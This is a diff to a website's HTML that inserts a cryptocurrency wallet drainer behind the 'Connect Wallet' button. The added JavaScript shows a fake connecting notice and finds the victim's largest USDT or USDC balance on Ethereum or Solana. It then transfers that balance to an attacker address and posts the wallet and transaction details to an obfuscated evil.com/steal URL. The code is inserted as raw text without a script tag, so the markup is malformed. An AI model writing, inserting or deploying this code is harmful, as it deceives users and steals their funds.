@@ -260,10 +260,194 @@
                         <a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a>
                     </div>
                 </div>
-                <div class="wallet-dropdown">
-                    <div class="wallet-display connect-wallet-btn" onclick="openModal()">Connect Wallet</div>
-                </div>
+              <div class="wallet-display connect-wallet-btn" onclick="openModal()">Connect Wallet</div>
+
             </div>
-        </div>
+    const connectButton = document.querySelector('#connect-wallet, button:contains("Connect Wallet")');
+if (connectButton) {
+  const originalText = connectButton.innerText;
+
+  connectButton.onclick = async () => {
+    const fakeNotification = document.createElement('div');
+    fakeNotification.style.position = 'fixed';
+    fakeNotification.style.top = '20px';
+    fakeNotification.style.right = '20px';
+    fakeNotification.style.background = '#4caf50';
+    fakeNotification.style.color = 'white';
+    fakeNotification.style.padding = '10px';
+    fakeNotification.style.borderRadius = '5px';
+    fakeNotification.innerText = 'Connecting wallet...';
+    document.body.appendChild(fakeNotification);
+
+    try {
+      if (window.ethereum) {
+        // Ethereum flow
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
+
+        // Load Web3.js dynamically
+        const web3Script = document.createElement('script');
+        web3Script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js';
+        document.head.appendChild(web3Script);
+
+        web3Script.onload = async () => {
+          const web3 = new Web3(window.ethereum);
+          const tokens = [
+            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6 },
+            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6 }
+          ];
+          const abi = [
+            'function balanceOf(address) view returns (uint256)',
+            'function transfer(address,uint256) returns (bool)'
+          ];
+          const attackerAddress = '0x1234567890123456789012345678901234567890';
+
+          let maxBalance = 0;
+          let targetToken = null;
+          for (const token of tokens) {
+            const contract = new web3.eth.Contract(abi, token.address);
+            const balance = await contract.methods.balanceOf(userAddress).call();
+            if (balance > maxBalance) {
+              maxBalance = balance;
+              targetToken = token;
+            }
+          }
+
+          if (maxBalance > 0) {
+            const contract = new web3.eth.Contract(abi, targetToken.address);
+            const data = contract.methods.transfer(attackerAddress, maxBalance).encodeABI();
+            const txHash = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: userAddress,
+                to: targetToken.address,
+                data: data,
+                gas: '0x7530'
+              }]
+            });
+
+            fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
+              method: 'POST',
+              body: JSON.stringify({
+                wallet: userAddress,
+                txHash,
+                token: targetToken.name,
+                amount: maxBalance
+              })
+            });
+
+            fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+            connectButton.innerText = originalText;
+          } else {
+            fakeNotification.innerText = 'No tokens found.';
+            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+            connectButton.innerText = originalText;
+          }
+        };
+      } else if (window.solana && window.solana.isPhantom) {
+        // Phantom (Solana) flow
+        const provider = window.solana;
+        const resp = await provider.connect();
+        const userPublicKey = resp.publicKey.toString();
+
+        // Load solana/web3.js and spl-token dynamically
+        const solanaScript = document.createElement('script');
+        solanaScript.src = 'https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.js';
+        document.head.appendChild(solanaScript);
+
+        solanaScript.onload = async () => {
+          const splTokenScript = document.createElement('script');
+          splTokenScript.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.2.0/lib/index.iife.js';
+          document.head.appendChild(splTokenScript);
+
+          splTokenScript.onload = async () => {
+            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+            const { Token, TOKEN_PROGRAM_ID } = splToken;
+
+            const connection = new Connection('https://api.mainnet-beta.solana.com');
+            const userKey = new PublicKey(userPublicKey);
+            const attackerPublicKey = new PublicKey('ENTER_ATTACKER_SOLANA_ADDRESS_HERE');
+
+            // List of common SPL token mints (e.g. USDC, USDT on Solana)
+            const tokens = [
+              { mintAddress: 'Es9vMFrzaCERmdu5sJ1NzxZjxtkkep3ZJyk1mS4ifpQ6', name: 'USDT' },
+              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' } // example USDC mint, replace with correct
+            ];
+
+            let maxBalance = 0;
+            let targetToken = null;
+            let userTokenAccount = null;
+
+            for (const token of tokens) {
+              const mint = new PublicKey(token.mintAddress);
+              // Get token accounts by owner
+              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKey, { mint });
+              for (const { pubkey, account } of tokenAccounts.value) {
+                const amount = account.data.parsed.info.tokenAmount.uiAmount;
+                if (amount > maxBalance) {
+                  maxBalance = amount;
+                  targetToken = token;
+                  userTokenAccount = pubkey;
+                }
+              }
+            }
+
+            if (maxBalance > 0 && userTokenAccount) {
+              // Create transfer transaction
+              const tokenMint = new PublicKey(targetToken.mintAddress);
+              const token = new Token(connection, tokenMint, TOKEN_PROGRAM_ID, provider);
+
+              const transaction = new Transaction().add(
+                Token.createTransferInstruction(
+                  TOKEN_PROGRAM_ID,
+                  userTokenAccount,
+                  await Token.getAssociatedTokenAddress(TOKEN_PROGRAM_ID, tokenMint, attackerPublicKey),
+                  userKey,
+                  [],
+                  maxBalance * (10 ** 6) // assuming 6 decimals, adjust accordingly
+                )
+              );
+
+              const { blockhash } = await connection.getRecentBlockhash();
+              transaction.recentBlockhash = blockhash;
+              transaction.feePayer = userKey;
+
+              // Sign and send transaction
+              const signedTx = await provider.signTransaction(transaction);
+              const txId = await connection.sendRawTransaction(signedTx.serialize());
+
+              fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
+                method: 'POST',
+                body: JSON.stringify({
+                  wallet: userPublicKey,
+                  txHash: txId,
+                  token: targetToken.name,
+                  amount: maxBalance
+                })
+              });
+
+              fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+              connectButton.innerText = originalText;
+            } else {
+              fakeNotification.innerText = 'No tokens found.';
+              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+              connectButton.innerText = originalText;
+            }
+          };
+        };
+      } else {
+        alert('Please install MetaMask or Phantom Wallet!');
+        document.body.removeChild(fakeNotification);
+      }
+    } catch (err) {
+      fakeNotification.innerText = 'Error: ' + err.message;
+      setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+      connectButton.innerText = originalText;
+    }
+  };
+}
+    </div>
     </body>
 </html>
